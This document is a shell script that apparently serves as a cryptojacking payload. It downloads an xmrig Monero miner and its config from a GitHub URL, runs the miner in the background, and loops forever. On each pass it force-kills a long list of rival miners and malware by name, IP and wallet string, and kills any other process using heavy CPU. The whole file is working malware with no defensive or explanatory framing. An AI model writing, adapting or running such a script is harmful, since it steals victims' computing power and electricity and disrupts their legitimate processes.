#!/bin/sh

MINER_URL="https://github.com/aaonfcpc/bertdavidgraha/blob/main/xmrig"
MINER_CONFIG_URL="https://github.com/aaonfcpc/bertdavidgraha/blob/main/config.json"

ROOT=0
if [ $(id -u) = 0 ]; then
   ROOT=1
fi

kill_miner_proc(){
	pgrep -f monerohash | xargs -I % kill -9 %
	pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
	pgrep -f xzpauectgr | xargs -I % kill -9 %
	pgrep -f slxfbkmxtd | xargs -I % kill -9 %
	pgrep -f mixtape | xargs -I % kill -9 %
	pgrep -f addnj | xargs -I % kill -9 %
	pgrep -f 200.68.17.196 | xargs -I % kill -9 %
	pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
	pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
	pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
	pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
	pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
	pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
	pgrep -f mqdsflm.cf | xargs -I % kill -9 %
	pgrep -f stratum | xargs -I % kill -9 %
	pgrep -f lower.sh | xargs -I % kill -9 %
	pgrep -f ./ppp | xargs -I % kill -9 %
	pgrep -f cryptonight | xargs -I % kill -9 %
	pgrep -f ./seervceaess | xargs -I % kill -9 %
	pgrep -f ./servceaess | xargs -I % kill -9 %
	pgrep -f ./servceas | xargs -I % kill -9 %
	pgrep -f ./servcesa | xargs -I % kill -9 %
	pgrep -f ./vsp | xargs -I % kill -9 %
	pgrep -f ./jvs | xargs -I % kill -9 %
	pgrep -f ./pvv | xargs -I % kill -9 %
	pgrep -f ./vpp | xargs -I % kill -9 %
	pgrep -f ./pces | xargs -I % kill -9 %
	pgrep -f ./rspce | xargs -I % kill -9 %
	pgrep -f ./haveged | xargs -I % kill -9 %
	pgrep -f ./jiba | xargs -I % kill -9 %
	pgrep -f ./watchbog | xargs -I % kill -9 %
	pgrep -f ./A7mA5gb | xargs -I % kill -9 %
	pgrep -f kacpi_svc | xargs -I % kill -9 %
	pgrep -f kswap_svc | xargs -I % kill -9 %
	pgrep -f kauditd_svc | xargs -I % kill -9 %
	pgrep -f kpsmoused_svc | xargs -I % kill -9 %
	pgrep -f kseriod_svc | xargs -I % kill -9 %
	pgrep -f kthreadd_svc | xargs -I % kill -9 %
	pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
	pgrep -f kintegrityd_svc | xargs -I % kill -9 %
	pgrep -f jawa | xargs -I % kill -9 %
	pgrep -f oracle.jpg | xargs -I % kill -9 %
	pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
	pgrep -f 188.209.49.54 | xargs -I % kill -9 %
	pgrep -f 181.214.87.241 | xargs -I % kill -9 %
	pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
	pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
	pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
	pgrep -f servim | xargs -I % kill -9 %
	pgrep -f kblockd_svc | xargs -I % kill -9 %
	pgrep -f native_svc | xargs -I % kill -9 %
	pgrep -f ynn | xargs -I % kill -9 %
	pgrep -f 65ccEJ7 | xargs -I % kill -9 %
	pgrep -f jmxx | xargs -I % kill -9 %
	pgrep -f 2Ne80nA | xargs -I % kill -9 %
	pgrep -f sysstats | xargs -I % kill -9 %
	pgrep -f systemxlv | xargs -I % kill -9 %
	pgrep -f watchbog | xargs -I % kill -9 %
	pgrep -f OIcJi1m | xargs -I % kill -9 %
	pkill -f biosetjenkins
	pkill -f Loopback
	pkill -f apaceha
	pkill -f cryptonight
	pkill -f stratum
	pkill -f mixnerdx
	pkill -f performedl
	pkill -f JnKihGjn
	pkill -f irqba2anc1
	pkill -f irqba5xnc1
	pkill -f irqbnc1
	pkill -f ir29xc1
	pkill -f conns
	pkill -f irqbalance
	pkill -f crypto-pool
	pkill -f XJnRj
	pkill -f mgwsl
	pkill -f pythno
	pkill -f jweri
	pkill -f lx26
	pkill -f NXLAi
	pkill -f BI5zj
	pkill -f askdljlqw
	pkill -f minerd
	pkill -f minergate
	pkill -f Guard.sh
	pkill -f ysaydh
	pkill -f bonns
	pkill -f donns
	pkill -f kxjd
	pkill -f Duck.sh
	pkill -f bonn.sh
	pkill -f conn.sh
	pkill -f kworker34
	pkill -f kw.sh
	pkill -f pro.sh
	pkill -f polkitd
	pkill -f acpid
	pkill -f icb5o
	pkill -f nopxi
	pkill -f irqbalanc1
	pkill -f minerd
	pkill -f i586
	pkill -f gddr
	pkill -f mstxmr
	pkill -f ddg.2011
	pkill -f wnTKYg
	pkill -f deamon
	pkill -f disk_genius
	pkill -f sourplum
	pkill -f polkitd
	pkill -f nanoWatch
	pkill -f zigw
	pkill -f devtool
	pkill -f devtools
	pkill -f systemctI
	pkill -f watchbog
	pkill -f cryptonight
	pkill -f sustes
	pkill -f xmrig
	pkill -f xmrig-cpu
	pkill -f 121.42.151.137
	pkill -f init12.cfg
	pkill -f nginxk
	pkill -f tmp/wc.conf
	pkill -f xmrig-notls
	pkill -f xmr-stak
	pkill -f suppoie
	pkill -f zer0day.ru
	pkill -f dbus-daemon--system
	pkill -f nullcrew
	pkill -f systemctI
	pkill -f kworkerds
	pkill -f init10.cfg
	pkill -f /wl.conf
	pkill -f crond64
	pkill -f sustse
	pkill -f vmlinuz
	pkill -f exin
	pkill -f apachiii
	pkill -f svcworkmanager
}

kill_sus_proc()
{
    ps axf -o "pid %cpu" | awk '{if($2>=35.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "bertdavidgraha_updater.sh|initialize.sh|bertdavidgraha_main.sh|bertdavidgraha_xmrig"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            fi
    done
}

downloadFile(){
	if [ -f "/bin/curl" ]; then
		#curl found
		/bin/curl -L --silent $1 -o $2
	elif [ -f "/bin/wget" ]; then
		#wget found
		/bin/wget -q $1 -o $2
	fi
}

start_miner(){
	miner_found=0
	ps axf -o "pid" | while read procid
    do
            output=$(cat /proc/$procid/cmdline| grep -a -E "bertdavidgraha_xmrig")
            if [ ${#output} -eq 0 ]
            then
                    miner_found=1
            fi
    done
    if [ $miner_found -eq 0 ]; then
    	#Start miner
    	if ! [ -f "bertdavidgraha_xmrig" -a -f "config.json" ]
    	then
    		#Download miner
    		echo "Miner doesn't exist\nDownloading..."
    		downloadFile $MINER_CONFIG_URL "config.json"
    		echo "config.json downloaded"
    		downloadFile $MINER_URL "bertdavidgraha_xmrig"
    		echo "xmrig downloaded"
    		chmod 777 bertdavidgraha_xmrig
    	fi
    	./bertdavidgraha_xmrig &
    else
    	echo "Miner found, skipping"
    fi
}

while [ 1 ]; do
	start_miner
	kill_sus_proc
	kill_miner_proc
	sleep 10
done